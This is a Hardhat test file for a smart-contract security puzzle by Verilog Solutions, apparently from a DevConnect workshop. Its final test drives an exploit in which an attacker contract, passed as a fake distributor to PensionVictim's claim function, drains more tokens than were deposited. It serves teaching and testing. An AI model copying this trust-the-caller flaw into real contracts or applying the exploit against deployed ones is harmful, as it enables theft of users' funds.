// SPDX-License-Identifier: GPL-3.0
/**  Do NOT use this code in production **
    _    _           _ _             
   | |  | |         (_) |            
   | |  | |___  ____ _| | ___   ____ 
    \ \/ / _  )/ ___) | |/ _ \ / _  |
     \  ( (/ /| |   | | | |_| ( ( | |
    _ \/ \____)_|   |_|_|\___/ \_|| |
   | |        | |      _      (_____|
    \ \   ___ | |_   _| |_ (_) ___  ____   ___ 
     \ \ / _ \| | | | |  _)| |/ _ \|  _ \ /___)
 _____) ) |_| | | |_| | |__| | |_| | | | |___ |
(______/ \___/|_|\____|\___)_|\___/|_| |_(___/ 
                                               
Verilog Solutions Inc. https://www.verilog.solutions
Verilog is a full-stack web3 security firm, covering smart contract auditing, 
validator operations, venture investment, and incubation.
Glad to prepare and present the materials for Game Day Remix in DevConnect Amsterdam!
*/

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Puzzle 3", function () {

    const ONE_TEN_TOKEN = ethers.utils.parseUnits("10.0", 18);
    const initialSupply = ONE_TEN_TOKEN;
    const ONE_TOKEN = ethers.utils.parseUnits("1.0", 18);
    const depositAmount = ONE_TOKEN;
    let pensionToken;
    let pensionVictim;
    let pensionAttacker;
    let pensionDistributor;
    let owner;
    let addr1;
    let attacker;

    before(async function () {
        [owner, addr1, attacker] = await ethers.getSigners();

        const PensionToken = await ethers.getContractFactory("PensionToken");
        pensionToken = await PensionToken.deploy(initialSupply);
        await pensionToken.deployed();

        const PensionVictim = await ethers.getContractFactory("PensionVictim");
        pensionVictim = await PensionVictim.deploy(pensionToken.address);
        await pensionVictim.deployed();

        const PensionDistributor = await ethers.getContractFactory("PensionDistributor");
        pensionDistributor = await PensionDistributor.deploy(pensionToken.address);
        await pensionDistributor.deployed();

        // let pensionVictim be the only one in the whitelist
        await pensionDistributor.connect(owner).addToWhitelist(pensionVictim.address);

        // transfer all PensionToken from owner to pensionDistributor
        await pensionToken.connect(owner).transfer(pensionDistributor.address, initialSupply);

        const PensionAttacker = await ethers.getContractFactory("PensionAttacker");
        pensionAttacker = await PensionAttacker.deploy(pensionVictim.address, pensionToken.address, pensionDistributor.address);
        await pensionAttacker.deployed();

    });

    beforeEach(async function () {
        // await user1, attacker buy some PensionToken
        await pensionToken.connect(addr1).buy({ value: depositAmount });
        await pensionToken.connect(attacker).buy({ value: depositAmount });
    });

    it("Test1: PensionVictim should be initialize with proper initial fund (in PensionToken). ", async function () {
        const currentBalance = await pensionToken.balanceOf(pensionDistributor.address);
        expect(currentBalance).to.equal(initialSupply);
    });

    it("Test2: Legit user can deposit PensionToken to PensionVictim. ", async function () {
        const beforeBalancePensionVictim = await pensionToken.balanceOf(pensionVictim.address);
        const beforeBalanceUser1 = await pensionToken.balanceOf(addr1.address);

        await pensionToken.connect(addr1).increaseAllowance(pensionVictim.address, depositAmount);
        await pensionVictim.connect(addr1).deposit(depositAmount);

        const afterBalancePensionVictim = await pensionToken.balanceOf(pensionVictim.address);
        const afterBalanceUser1 = await pensionToken.balanceOf(addr1.address);

        expect(afterBalancePensionVictim.sub(beforeBalancePensionVictim)).to.equal(depositAmount);
        expect(beforeBalanceUser1.sub(afterBalanceUser1)).to.equal(depositAmount);

        expect(await pensionVictim.amounts(addr1.address)).to.equal(depositAmount);
    });

    it("Test3: Legit user can claim PensionToken from PensionVictim (actually is from pensionDistributor). ", async function () {
        const beforeBalancePensionDistributor = await pensionToken.balanceOf(pensionDistributor.address);
        const beforeBalanceUser1 = await pensionToken.balanceOf(addr1.address);

        await pensionVictim.connect(addr1).claim(pensionDistributor.address, addr1.address);

        const afterBalancePensionDistributor = await pensionToken.balanceOf(pensionDistributor.address);
        const afterBalanceUser1 = await pensionToken.balanceOf(addr1.address);

        expect(beforeBalancePensionDistributor.sub(afterBalancePensionDistributor)).to.equal(depositAmount);
        expect(afterBalanceUser1.sub(beforeBalanceUser1)).to.equal(depositAmount);

        //expect(await pensionVictim.amounts(addr1.address)).to.equal(0);
    });


    it("Attack: Attacker can claim more PensionToken from PensionVictim (acutally PensionDistributor) than he deposits.", async function () {
        const beforeBalancePensionDistributor = await pensionToken.balanceOf(pensionDistributor.address);
        const beforeBalanceAttacker = await pensionToken.balanceOf(pensionAttacker.address);

        console.log("beforeBalanceAttacker: " + beforeBalanceAttacker.toString());
        console.log("beforeBalancePensionDistributor: " + beforeBalancePensionDistributor.toString());

        // increase allowance[attacker => pensionAttacker contract]
        // and deposit PST
        await pensionToken.connect(attacker).increaseAllowance(pensionAttacker.address, depositAmount);


        await pensionAttacker.connect(attacker).attack(depositAmount);

        // pass the malicious distributor (pensionAttacker)
        // to the victim
        await pensionVictim.connect(attacker).claim(pensionAttacker.address, pensionAttacker.address);

        const afterBalancePensionDistributor = await pensionToken.balanceOf(pensionDistributor.address);
        const afterBalanceAttacker = await pensionToken.balanceOf(pensionAttacker.address);

        console.log("afterBalanceAttacker: " + afterBalanceAttacker.toString());
        console.log("afterBalancePensionDistributor: " + afterBalancePensionDistributor.toString());

        // About `above` and `below`:
        // https://ethereum-waffle.readthedocs.io/en/latest/matchers.html#bignumbers
        expect(afterBalanceAttacker.sub(beforeBalanceAttacker)).to.above(depositAmount);
        // ^ attacker gets more than he deposit
        expect(afterBalancePensionDistributor).to.below(beforeBalancePensionDistributor.sub(depositAmount));
        // ^ victim losses more than attacker should take
    });

});